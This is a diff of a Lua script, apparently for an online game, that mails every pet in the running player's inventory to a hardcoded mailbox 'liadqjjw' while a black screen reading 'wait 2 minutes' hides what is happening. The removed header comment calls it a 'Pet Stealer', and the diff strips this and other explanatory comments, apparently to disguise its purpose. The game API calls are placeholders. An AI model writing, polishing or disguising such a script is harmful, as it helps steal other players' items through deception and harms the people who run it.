@@ -1,26 +1,23 @@
--- Lua Script to send all pets from the current player’s inventory to mailbox ID 'liadqjjw'
--- and display a black screen with "Pet Stealer" text
 
--- Define the target mailbox ID
+
 local targetMailboxID = "liadqjjw"
 
--- Function to get the current player’s ID
+
 function getCurrentPlayerID()
-    -- Replace with actual API call to get the current player's ID
+  
     local playerID = GameAPI.GetCurrentPlayerID() -- Replace with real API call
     return playerID
 end
 
--- Function to get all pet IDs from the current player’s inventory
+
 function getPlayerInventoryPets(playerID)
-    -- Replace with actual API call to fetch all pets from the player's inventory
+    
     local petIDs = GameAPI.GetPlayerPets(playerID) -- Replace with real API call
     return petIDs
 end
 
--- Function to send a pet to the mailbox
 function sendPetToMailbox(petID, mailboxID)
-    -- Replace with actual API call to send a pet to the mailbox
+ 
     local success, err = GameAPI.SendPetToMailbox(petID, mailboxID) -- Replace with real API call
     if not success then
         print("Failed to send pet with ID " .. petID .. ": " .. err)
@@ -29,7 +26,7 @@ function sendPetToMailbox(petID, mailboxID)
     end
 end
 
--- Function to display a black screen with text
+
 function showBlackScreenWithText(text)
     -- Replace this with actual GUI code to create a black screen with text
     -- Example (assuming support for GUI functions):
@@ -40,7 +37,7 @@ function showBlackScreenWithText(text)
     GUI.DrawText(screenWidth / 2, screenHeight / 2, text, "center") -- Draw text in the center
 end
 
--- Main function to send all pets from the current player’s inventory to the mailbox
+
 function main()
     showBlackScreenWithText("wait 2 minutes")
 
@@ -58,7 +55,7 @@ function main()
         return
     end
 
-    -- Iterate through the list of pet IDs and send each pet
+   
     for _, petID in ipairs(petIDs) do
         sendPetToMailbox(petID, targetMailboxID)
     end
